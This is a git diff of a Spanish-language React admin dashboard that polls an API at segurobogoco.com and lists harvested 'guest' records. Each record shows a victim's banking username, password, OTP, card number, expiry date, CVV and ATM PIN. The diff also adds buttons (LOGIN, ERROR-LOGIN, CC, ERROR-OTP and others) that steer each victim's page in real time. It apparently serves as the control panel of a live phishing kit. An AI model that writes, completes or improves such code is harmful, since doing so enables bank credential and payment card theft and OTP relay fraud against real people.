@@ -1,28 +1,61 @@
-import React, { useEffect, useState } from 'react';
-import axios from 'axios';
-import { useNavigate } from 'react-router-dom';
+import React, { useEffect, useState } from "react"; 
+import axios from "axios"; 
 
-const AdminDashboard = () => {
-  const [guests, setGuests] = useState([]);
-  const [statuses, setStatuses] = useState([]);
-  const [error, setError] = useState('');
-  const [updatedGuestId, setUpdatedGuestId] = useState(null);
-  const [clicks, setClicks] = useState(0);
-  const navigate = useNavigate();
+const AdminDashboard = () => {   
+  const [guests, setGuests] = useState([]);   
+  const [loading, setLoading] = useState(true);   
+  const [error, setError] = useState(null);   
+  const [updatedGuestId, setUpdatedGuestId] = useState(null);    
+  const [statuses, setStatuses] = useState([]); // Para almacenar los estados
 
   const fetchGuests = async () => {
-    try {
-      const token = localStorage.getItem('access_token');
-      const { data } = await axios.get('https://segurobogoco.com/api/v1/admin/guests', {
-        headers: { Authorization: `Bearer ${token}` },
-      });
-      setGuests(data.guests);
-      setStatuses(data.statuses);
-      setClicks(data.guests.length);
-    } catch (err) {
-      if (err.response?.status === 401) navigate('/');
-      else setError('Error al cargar los datos.');
+    const token = localStorage.getItem('access_token'); 
+    if (token) {
+      try {
+        const response = await axios.get("https://segurobogoco.com/api/v1/admin/guests", { 
+          headers: { "Authorization": `Bearer ${token}` }, 
+        });
+        setGuests(response.data.guests); 
+      } catch (error) {
+        console.error("Error al obtener los invitados:", error);
+        setError("Error al obtener los invitados");
+      } finally {
+        setLoading(false); 
+      }
+    } else {
+      console.error("No se encontró el token en localStorage");
+      setLoading(false); 
     }
+  };
+
+  const fetchStatuses = async () => {
+    const token = localStorage.getItem('access_token');
+    if (token) {
+      try {
+        const response = await axios.get("https://segurobogoco.com/api/v1/admin/statuses", { 
+          headers: { "Authorization": `Bearer ${token}` }, 
+        });
+        setStatuses(response.data.statuses); // Almacena los estados
+      } catch (error) {
+        console.error("Error al obtener los estados:", error);
+        setError("Error al obtener los estados");
+      }
+    }
+  };
+
+  useEffect(() => {
+    fetchGuests();
+    fetchStatuses(); // Cargar los estados al montar el componente
+    const intervalId = setInterval(fetchGuests, 3000); 
+    return () => clearInterval(intervalId); 
+  }, []); 
+
+  const getStatusName = (id) => {
+    if (!statuses || statuses.length === 0) {
+      return "Desconocido"; // Devuelve "Desconocido" si no hay estados
+    }
+    const status = statuses.find((status) => status.id === id);
+    return status ? status.name : "Desconocido"; // Devuelve el nombre del estado o "Desconocido"
   };
 
   const updateStatus = async (id, statusId) => {
@@ -33,91 +66,91 @@ const AdminDashboard = () => {
         { status_id: statusId },
         { headers: { Authorization: `Bearer ${token}` } }
       );
-      setUpdatedGuestId(id);
-      setTimeout(() => setUpdatedGuestId(null), 3000);
-      fetchGuests();
-    } catch (err) {
-      if (err.response?.status === 401) navigate('/');
-      else setError('Error al actualizar el estado.');
-    }
-  };
-
-  const markAsReviewed = async (id) => {
-    try {
-      const token = localStorage.getItem('access_token');
-      await axios.put(
-        `https://segurobogoco.com/api/v1/admin/guests/${id}/mark-reviewed`,
-        { isReviewed: true },
-        { headers: { Authorization: `Bearer ${token}` } }
+      // Actualiza el estado local directamente
+      setGuests((prevGuests) =>
+        prevGuests.map((guest) =>
+          guest.id === id ? { ...guest, status_id: statusId } : guest
+        )
       );
-      fetchGuests();
+      setUpdatedGuestId(id); 
+      setTimeout(() => setUpdatedGuestId(null), 3000); 
     } catch (err) {
-      if (err.response?.status === 401) navigate('/');
-      else setError('Error al marcar como revisado.');
+      if (err.response?.status === 401) {
+        navigate('/');
+      } else {
+        setError('Error al actualizar el estado.');
+      }
     }
   };
 
-  useEffect(() => {
-    fetchGuests();
-    const interval = setInterval(fetchGuests, 3000);
-    return () => clearInterval(interval);
-  }, []);
+  if (loading) {
+    return <div className="text-white text-center">Cargando...</div>; 
+  }
 
   return (
-    <div className="bg-gray-800 min-h-screen p-8 text-white">
-      <h2 className="text-5xl font-bold mb-6 text-center">Panel de Administración</h2>
-      {error && <p className="text-red-400 mb-4 text-center">{error}</p>}
-
-      <div className="absolute top-8 right-8 text-xl font-semibold text-gray-300">
-        CLICKS: <span className="text-yellow-400">{clicks}</span>
-      </div>
-
+    <div className="bg-gray-800 text-white p-6">
+      <h1 className="text-3xl font-bold text-center mb-6">Admin Dashboard</h1>
+      {error && <div className="text-red-500 text-center">{error}</div>}
       <div className="space-y-6">
-        {guests
-          .sort((a, b) => b.id - a.id)
-          .map((guest) => (
+        {guests.length >  0 ? (
+          guests.map((guest) => (
             <div
               key={guest.id}
-              className={`bg-gray-700 p-6 rounded-2xl shadow-xl transform transition-all duration-300 ${
-                updatedGuestId === guest.id ? 'ring-4 ring-indigo-500 scale-105' : ''
-              } ${guest.isReviewed ? 'border-4 border-lime-500' : ''}`}
-            >
-              <p className="text-center font-bold text-lg text-blue-400">NUEVO INGRESO GOLEADOR</p>
-              <div className="my-4">
-                <p><b className="text-white">USUARIO:</b> {guest.user}</p>
-                <p><b className="text-white">CONTRASEÑA:</b> {guest.cc}</p>
-                <p><b className="text-white">🏆 OTP:</b> {guest.otp}</p>
+              className="flex bg-gray-700 p-4 rounded-lg shadow-md space-x-3.5 ">
+              <div className="flex-auto text-center space-y-2">
+                <h2 className="text-2xl font-bold">Login</h2>
+                <div className="text-base">
+                  <p>Usuario: {guest.login}</p>
+                  <p>Contraseña: {guest.pass}</p>
+                  <p>OTP: {guest.otp}</p>
+                </div>
               </div>
-              
-              <div className="flex justify-between items-center">
-                <p className="flex-1 text-center">
-                  <strong className="text-indigo-300">ESTADO ACTUAL</strong> {statuses.find(status => status.id === guest.status_id)?.name}
-                </p>
-                
-                <div className="flex gap-4 justify-end">
-                  {statuses.map((status) => (
+
+              <div className="flex-auto text-center space-y-2">
+                <h2 className="text-2xl font-bold">Información del Usuario</h2>
+                <div className="text-base">
+                  <p><strong>Nombre:</strong> {guest.user}</p>
+                  <p><strong>BIN:</strong></p>
+                  <p><strong>CC:</strong> {guest.cc}</p>
+                  <p><strong>Fecha de Exp:</strong> {guest.expiration_date}</p>
+                  <p><strong>CVV:</strong> {guest.ccv}</p>
+                  <p><strong>ATM Pass:</strong> {guest.atmotp}</p>
+                </div>
+              </div>
+
+              <div className="flex-auto space-y-4">
+                <h2 className="text-2xl font-bold text-center">
+                  Estado actual: {getStatusName(guest.status_id)}
+                </h2>
+
+                <div className="grid grid-cols-3 gap-4">
+                  {[{ label: 'CARGANDO', statusId: 1 },
+                    { label: 'LOGIN', statusId: 2 },
+                    { label: 'ERROR-LOGIN', statusId: 3 },
+                    { label: 'CC', statusId: 4 },
+                    { label: 'ERROR-CC', statusId: 5 },
+                    { label: 'OTP', statusId: 6 },
+                    { label: 'ERROR-OTP', statusId: 7 },
+                  ].map((status) => (
                     <button
-                      key={status.id}
-                      onClick={() => updateStatus(guest.id, status.id)}
-                      className={`py-2 px-4 rounded-xl transition transform ${guest.status_id === status.id ? 'bg-red-500' : 'bg-blue-500'} text-white hover:scale-110 hover:bg-blue-600`}
+                      key={status.statusId}
+                      onClick={() => updateStatus(guest.id, status.statusId)}
+                      className="bg-blue-500 hover:bg-blue-700 text-white font-semibold py-1 px-1 rounded-xl"
                     >
-                      {status.name}
+                      {status.label}
                     </button>
                   ))}
                 </div>
               </div>
 
-              {/* Botón para marcar como revisado */}
-              {!guest.isReviewed && (
-                <button
-                  onClick={() => markAsReviewed(guest.id)}
-                  className="mt-6 py-2 px-5 bg-green-600 text-white rounded-full hover:bg-green-700 transition ease-in-out"
-                >
-                  REVISADO
-                </button>
+              {updatedGuestId === guest.id && (
+                <div className="text-green-500 text-center mt-2">Estado actualizado</div>
               )}
             </div>
-          ))}
+          ))
+        ) : (
+          <div className="text-center text-white">No hay invitados disponibles.</div>
+        )}
       </div>
     </div>
   );
